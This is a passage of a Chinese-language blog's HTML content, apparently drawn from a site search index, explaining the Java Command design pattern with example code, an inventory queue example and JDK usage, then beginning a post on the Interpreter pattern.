title=\"命令模式\"></a>命令模式</h3><blockquote>\n<p>将一个请求封装为一个对象，从而让我们可用不同的请求对客户进行参数化；对请求排队或者记录请求日志，以及支持可撤销的操作。命令模式是一种对象行为型模式，其别名为动作(Action)模式或事务(Transaction)模式。</p>\n</blockquote>\n<p>UML类图如下：<br><img src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8A%E5%8D%889.28.37.png\"><br><img src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8A%E5%8D%889.44.24.png\"></p>\n<span id=\"more\"></span>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象命令</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Command</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//命令执行方法</span></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 调用者</span></span><br><span class=\"line\"><span class=\"comment\"> * 用于发起命令</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Invoker</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Command command;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Invoker</span><span class=\"params\">(Command command)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.command = command;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 业务方法，用于调用命令</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">call</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        command.execute();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 具体命令类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteCommand</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Command</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//接收者</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Receiver receiver;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcreteCommand</span><span class=\"params\">(Receiver receiver)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.receiver = receiver;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        receiver.action();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接收者</span></span><br><span class=\"line\"><span class=\"comment\">   常常会将Command实现类直接实现具体的逻辑和这个角色有重合</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Receiver</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">action</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;执行&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//接收者</span></span><br><span class=\"line\">        <span class=\"type\">Receiver</span> <span class=\"variable\">receiver</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Receiver</span>();</span><br><span class=\"line\">        <span class=\"comment\">//命令</span></span><br><span class=\"line\">        <span class=\"type\">Command</span> <span class=\"variable\">command</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConcreteCommand</span>(receiver);</span><br><span class=\"line\">        <span class=\"comment\">//客户端直接执行具体命令方式</span></span><br><span class=\"line\"><span class=\"comment\">//        command.execute();</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//客户端通过调用者来执行命令</span></span><br><span class=\"line\">        <span class=\"type\">Invoker</span> <span class=\"variable\">invoker</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Invoker</span>(command);</span><br><span class=\"line\">        invoker.call();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>Command（抽象命令类）:Command（抽象命令类）：抽象命令类一般是一个抽象类或接口，在其中声明了用于执行请求的execute()等方法，通过这些方法可以调用请求接收者的相关操作。</li>\n<li>ConcreteCommand（具体命令类）：具体命令类是抽象命令类的子类，实现了在抽象命令类中声明的方法，它对应具体的接收者对象，将接收者对象的动作绑定其中。在实现execute()方法时，将调用接收者对象的相关操作(Action)。</li>\n<li>Invoker（调用者）：调用者即请求发送者，它通过命令对象来执行请求。一个调用者并不需要在设计时确定其接收者，因此它只与抽象命令类之间存在关联关系。在程序运行时可以将一个具体命令对象注入其中，再调用具体命令对象的execute()方法，从而实现间接调用请求接收者的相关操作。</li>\n<li>Receiver（接收者）：接收者执行与请求相关的操作，它具体实现对请求的业务处理。</li>\n</ul>\n<p>命令模式的本质是对请求进行封装，一个请求对应于一个命令，将发出命令的责任和执行命令的责任分割开。每一个命令都是一个操作：请求的一方发出请求要求执行一个操作；接收的一方收到请求，并执行相应的操作。命令模式允许请求的一方和接收的一方独立开来，使得请求的一方不必知道接收请求的一方的接口，更不必知道请求如何被接收、操作是否被执行、何时被执行，以及是怎么被执行的。</p>\n<p>命令模式的关键在于引入了抽象命令类，请求发送者针对抽象命令类编程，只有实现了抽象命令类的具体命令才与请求接收者相关联。在最简单的抽象命令类中只包含了一个抽象的execute()方法，每个具体命令类将一个Receiver类型的对象作为一个实例变量进行存储，从而具体指定一个请求的接收者，不同的具体命令类提供了execute()方法的不同实现，并调用不同接收者的请求处理方法。</p>\n<h4 id=\"宏命令\"><a href=\"#宏命令\" class=\"headerlink\" title=\"宏命令\"></a>宏命令</h4><p>宏命令(Macro Command)又称为组合命令，它是组合模式和命令模式联用的产物。宏命令是一个具体命令类，它拥有一个集合属性，在该集合中包含了对其他命令对象的引用。通常宏命令不直接与请求接收者交互，而是通过它的成员来调用接收者的方法。当调用宏命令的execute()方法时，将递归调用它所包含的每个成员命令的execute()方法，一个宏命令的成员可以是简单命令，还可以继续是宏命令。执行一个宏命令将触发多个具体命令的执行，从而实现对命令的批处理。<br>新增命令队列：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 命令队列，批量执行命令</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MacroCommand</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;Command&gt;commandList = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">addCommand</span><span class=\"params\">(Command command)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> commandList.add(command);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">removeComand</span><span class=\"params\">(Command command)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> commandList.remove(command);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        commandList.forEach(Command::execute);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改调用者Invoker：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 调用者</span></span><br><span class=\"line\"><span class=\"comment\"> * 用于发起命令</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Invoker</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> MacroCommand macroCommand;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Invoker</span><span class=\"params\">(MacroCommand macroCommand)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.macroCommand = macroCommand;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 业务方法，用于调用命令</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">call</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        macroCommand.execute();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"实际举例\"><a href=\"#实际举例\" class=\"headerlink\" title=\"实际举例\"></a>实际举例</h4><p>需要一个库存项目，对外提供库存新增、扣减等操作。因为库存的频繁查询，实际库存是放入缓存中，为了避免数据库频繁更新，影响接口效率，更新缓存后，记录更新日志，方便日后查询，已经数据恢复。设计如下代码，采用命令设计模式把数据库操作抽象为相应的命令，对于数据库的操作封装好数据后放入队列，由其他线程处理队列中数据库操作命令，在实际应用中，为了避免因数据库宕机导致队列丢失，可以把命令修改操作放入消息中间件。<br>UML类图：<br><img src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8A%E5%8D%8811.08.46.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象命令</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Command</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//命令共有方法</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">updateCache</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//更新缓存，封装参数等，为后续操作做准备</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;更新缓存&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//命令执行方法</span></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 库存新增</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">IncreaseCommand</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Command</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> DBLog dbLog;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">IncreaseCommand</span><span class=\"params\">(DBLog dbLog)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.dbLog = dbLog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;缓存库存添加！！！&quot;</span>);</span><br><span class=\"line\">        dbLog.insertLog();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;其他操作！！！&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 库存扣减</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DecreaseCommand</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Command</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> DBLog dbLog;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">DecreaseCommand</span><span class=\"params\">(DBLog dbLog)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.dbLog = dbLog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;缓存库存扣减！！！&quot;</span>);</span><br><span class=\"line\">        dbLog.insertLog();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;其他操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 库存调用</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Invoker</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> BlockingQueue&lt;Command&gt; queue = <span class=\"keyword\">new</span> <span class=\"title class_\">LinkedBlockingQueue</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">put</span><span class=\"params\">(Command command)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        command.updateCache();</span><br><span class=\"line\">        queue.put(command);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">call</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    queue.take().execute();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 数据库操作</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DBLog</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String arg;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">DBLog</span><span class=\"params\">(String name, String arg)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.arg = arg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">insertLog</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(name + <span class=\"string\">&quot;：数据库日志插入！！参数：&quot;</span> + arg);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"type\">DBLog</span> <span class=\"variable\">increase</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DBLog</span>(<span class=\"string\">&quot;增加库存&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">DBLog</span> <span class=\"variable\">decrease</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DBLog</span>(<span class=\"string\">&quot;扣减库存&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Command</span> <span class=\"variable\">increaseCommand</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IncreaseCommand</span>(increase);</span><br><span class=\"line\">        <span class=\"type\">Command</span> <span class=\"variable\">decreaseCommand</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DecreaseCommand</span>(decrease);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Invoker</span> <span class=\"variable\">invoker</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Invoker</span>();</span><br><span class=\"line\">        invoker.put(increaseCommand);</span><br><span class=\"line\">        invoker.put(increaseCommand);</span><br><span class=\"line\">        invoker.put(decreaseCommand);</span><br><span class=\"line\"></span><br><span class=\"line\">        invoker.call();</span><br><span class=\"line\">        invoker.put(decreaseCommand);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在实际应用中，在用JAVA写GUI时，一个按钮有相应的功能，如果需要做到用户自定义按钮功能，也可以使用命令模式。</p>\n<h3 id=\"JDK中命令模式使用\"><a href=\"#JDK中命令模式使用\" class=\"headerlink\" title=\"JDK中命令模式使用\"></a>JDK中命令模式使用</h3><p>在JDK中ThreadPoolExecutor可以视为命令模式，UML类图如下：<br><img src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8A%E5%8D%889.35.31.png\"><br>在ThreadPoolExecutor中：</p>\n<ul>\n<li>ThreadPoolExecutor：调用者</li>\n<li>Runnable：抽象命令</li>\n<li>BlockingQueue：命令队列</li>\n</ul>\n<p>在需要执行命令时，由客户端实现Runnable提交到ThreadPoolExecutor由JVM执行执行。</p>\n<h3 id=\"命令模式总结\"><a href=\"#命令模式总结\" class=\"headerlink\" title=\"命令模式总结\"></a>命令模式总结</h3><p>命令模式是一种使用频率非常高的设计模式，它可以将请求发送者与接收者解耦，请求发送者通过命令对象来间接引用请求接收者，使得系统具有更好的灵活性和可扩展性。在基于GUI的软件开发，无论是在电脑桌面应用还是在移动应用中，命令模式都得到了广泛的应用。</p>\n<p><strong>应用场景：</strong></p>\n<ul>\n<li>GUI 中每一个按钮都是一条命令。</li>\n<li>系统需要将请求调用者和请求接收者解耦，使得调用者和接收者不直接交互。请求调用者无须知道接收者的存在，也无须知道接收者是谁，接收者也无须关心何时被调用。</li>\n<li>系统需要在不同的时间指定请求、将请求排队和执行请求。一个命令对象和请求的初始调用者可以有不同的生命期，换言之，最初的请求发出者可能已经不在了，而命令对象本身仍然是活动的，可以通过该命令对象去调用请求接收者，而无须关心请求调用者的存在性，可以通过请求日志文件等机制来具体实现。</li>\n<li>系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作。</li>\n<li>系统需要将一组操作组合在一起形成宏命令。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>降低系统的耦合度。由于请求者与接收者之间不存在直接引用，因此请求者与接收者之间实现完全解耦，相同的请求者可以对应不同的接收者，同样，相同的接收者也可以供不同的请求者使用，两者之间具有良好的独立性。</li>\n<li>新的命令可以很容易地加入到系统中。由于增加新的具体命令类不会影响到其他类，因此增加新的具体命令类很容易，无须修改原有系统源代码，甚至客户类代码，满足“开闭原则”的要求。</li>\n<li>在需要的情况下，可以比较容易的将命令记入日志。</li>\n<li>可以比较容易地设计一个命令队列或宏命令（组合命令）。</li>\n<li>为请求的撤销(Undo)和恢复(Redo)操作提供了一种设计和实现方案（如之前库存通过日志恢复）。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>使用命令模式可能会导致某些系统有过多的具体命令类。因为针对每一个对请求接收者的调用操作都需要设计一个具体命令类，因此在某些系统中可能需要提供大量的具体命令类，这将影响命令模式的使用。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","命令模式","Command Pattern"]},{"title":"Java设计模式-解释器模式（Interpreter Pattern）","url":"/2017/10/27/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F%EF%BC%88Interpreter-Pattern%EF%BC%89/","content":"<h3 id=\"解释器模式\"><a href=\"#解释器模式\" class=\"headerlink\" title=\"解释器模式\"></a>解释器模式</h3><blockquote>\n<p>定义一个语言的文法，并且建立一个解释器来解释该语言中的句子，这里的“语言”是指使用规定格式和语法的代码。解释器模式是一种类行为型模式。</p>\n</blockquote>\n<p>解释器模式是一种使用频率相对较低但学习难度较大的设计模式，它用于描述如何使用面向对象语言构成一个简单的语言解释器。在某些情况下，为了更好地描述某一些特定类型的问题，我们可以创建一种新的语言，这种语言拥有自己的表达式和结构，即文法规则，这些问题的实例将对应为该语言中的句子。此时，可以使用解释器模式来设计这种新的语言。对解释器模式的学习能够加深我们对面向对象思想的理解，并且掌握编程语言中文法规则的解释过程。</p>\n<p>由于表达式可分为终结符表达式和非终结符表达式，因此解释器模式的结构与组合模式的结构有些类似，但在解释器模式中包含更多的组成元素。</p>\n<span id=\"more\"></span>\n<p>UML类图如下：<br><img src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8B%E5%8D%882.07.29.png\"><br><img src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8B%E5%8D%882.07.45.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象表达式</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractExpression</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">interpret</span><span class=\"params\">(Context ctx)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 终结符表达式</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TerminalExpression</span> <span class=\"keyword\">extends</span>  <span class=\"title class_\">AbstractExpression</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"keyword\">void</span> <span class=\"title function_\">interpret</span><span class=\"params\">(Context ctx)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//终结符表达式的解释操作</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 非终结符表达式</span></span><br><span class=\"line\"><span class=\"comment\"> * 非终结符表达式中可以包含终结符表达式</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">NonterminalExpression</span> <span class=\"keyword\">extends</span>  <span class=\"title class_\">AbstractExpression</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span>  AbstractExpression left;</span><br><span class=\"line\">    <span class=\"keyword\">private</span>  AbstractExpression right;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"title function_\">NonterminalExpression</span><span class=\"params\">(AbstractExpression left,AbstractExpression right)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.left=left;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.right=right;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">interpret</span><span class=\"params\">(Context ctx)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//递归调用每一个组成部分的interpret()方法</span></span><br><span class=\"line\">        <span class=\"comment\">//在递归调用时指定组成部分的连接方式，即非终结符的功能</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 存储解释器之外的一些全局信息</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Context</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Map&lt;String, String&gt; map = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">assign</span><span class=\"params\">(String key, String value)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//往环境类中设值</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">lookup</span><span class=\"params\">(String key)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取存储在环境类中的值</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> map.get(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>AbstractExpression（抽象表达式）：在抽象表达式中声明了抽象的解释操作，它是所有终结符表达式和非终结符表达式的公共父类。</li>\n<li>TerminalExpression（终结符表达式）：终结符表达式是抽象表达式的子类，它实现了与文法中的终结符相关联的解释操作，在句子中的每一个终结符都是该类的一个实例。通常在一个解释器模式中只有少数几个终结符表达式类，它们的实例可以通过非终结符表达式组成较为复杂的句子。</li>\n<li>NonterminalExpression（非终结符表达式）：非终结符表达式也是抽象表达式的子类，它实现了文法中非终结符的解释操作，由于在非终结符表达式中可以包含终结符表达式，也可以继续包含非终结符表达式，因此其解释操作一般通过递归的方式来完成。</li>\n<li>Context（环境类）：环境类又称为上下文类，它用于存储解释器之外的一些全局信息，通常它临时存储了需要解释的语句。</li>\n</ul>\n<h3 id=\"数学表达式计算\"><a href=\"#数学表达式计算\" class=\"headerlink\" title=\"数学表达式计算\"></a>数学表达式计算</h3><p>在Js中通过eval(“1+2+3+4”)可以得出字符串数学表达式的值，在java中是无法直接解析这种字符串，通过解释器设计模式，设计可以解决计算字符串计算。<br>如：字符串”1+2*3-4”<br>使用形式化语言表示为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">expression ::= value | operation</span><br><span class=\"line\">operation ::= expression &#x27;+&#x27; expression | expression &#x27;-&#x27;  expression | expression &#x27;*&#x27;  expression | expression &#x27;/&#x27;  expression</span><br><span class=\"line\">value ::= an integer</span><br></pre></td></tr></table></figure>\n<p>使用抽象语法树表示为如下：<br><img 